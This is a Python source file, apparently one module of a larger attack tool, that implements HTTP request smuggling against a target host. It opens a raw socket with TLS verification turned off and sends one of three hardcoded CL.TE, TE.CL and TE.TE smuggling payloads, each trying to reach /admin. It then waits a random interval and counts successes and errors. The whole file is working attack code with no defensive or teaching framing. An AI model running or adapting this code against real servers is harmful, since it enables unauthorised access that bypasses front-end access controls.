import asyncio
import random
import aiohttp
import socket
from aiohttp import ClientSession, ClientTimeout, ClientError

class RequestSmuggling:
    def __init__(self, motor):
        self.motor = motor
        
    async def ejecutar(self, proxy=None):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if self.motor.ssl:
                import ssl
                contexto = ssl.create_default_context()
                contexto.check_hostname = False
                contexto.verify_mode = ssl.CERT_NONE
                sock = contexto.wrap_socket(sock, server_hostname=self.motor.host)
            
            sock.connect((self.motor.host, self.motor.puerto))
            
            payloads = [
                self._generar_smuggling_cl_te(),
                self._generar_smuggling_te_cl(),
                self._generar_smuggling_te_te()
            ]
            
            payload = random.choice(payloads).format(host=self.motor.host)
            sock.send(payload.encode())
            
            await asyncio.sleep(random.uniform(0.5, 2))
            
            try:
                respuesta = sock.recv(1024)
                self.motor.estadisticas.agregar_exito(len(payload) + len(respuesta))
            except:
                self.motor.estadisticas.agregar_exito(len(payload))
                
            sock.close()
            
        except Exception:
            self.motor.estadisticas.agregar_error()
            
    def _generar_smuggling_cl_te(self):
        return """POST / HTTP/1.1\r
Host: {host}\r
Content-Length: 13\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /admin HTTP/1.1\r
Host: {host}\r
\r
"""
    
    def _generar_smuggling_te_cl(self):
        return """POST / HTTP/1.1\r
Host: {host}\r
Transfer-Encoding: chunked\r
Content-Length: 100\r
\r
0\r
\r
GET /admin HTTP/1.1\r
Host: {host}\r
\r
"""
    
    def _generar_smuggling_te_te(self):
        return """POST / HTTP/1.1\r
Host: {host}\r
Transfer-Encoding: chunked\r
Transfer-Encoding: x\r
\r
0\r
\r
GET /admin HTTP/1.1\r
Host: {host}\r
\r
"""